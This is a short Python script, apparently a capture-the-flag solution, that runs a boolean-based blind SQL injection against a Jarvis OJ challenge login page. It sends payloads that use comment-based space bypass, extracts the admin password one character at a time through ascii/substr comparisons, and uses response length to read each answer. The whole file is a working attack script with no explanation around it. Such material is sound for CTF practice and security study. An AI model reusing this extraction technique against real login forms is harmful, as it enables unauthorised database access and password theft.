#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Time    : 2017/6/10 20:43
# @Author  : Set3rnal
# @Site    : 
# @File    : sqli.py
# @Software: PyCharm
#

import requests

result = ""
url = 'http://web.jarvisoj.com:32787/login.php'

payload = {"username": 'xx', "password": 1, }
username_temp = "'/**/or/**/ascii(substr((select/**/password/**/from/**/admin),{0},1))>{1}#"
chars = '0123456789@ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz'

for i in range(1, 32):
    for char in chars:
        char_ascii = ord(char)
        username = username_temp.format(i, char_ascii)
        payload['username'] = username
        response = requests.post(url=url, data=payload)
        length = len(response.text)
        # print length
        if length > 1191:
            result += char
            print result.ljust(40, '.')
            break

print "bingo!:"
print result
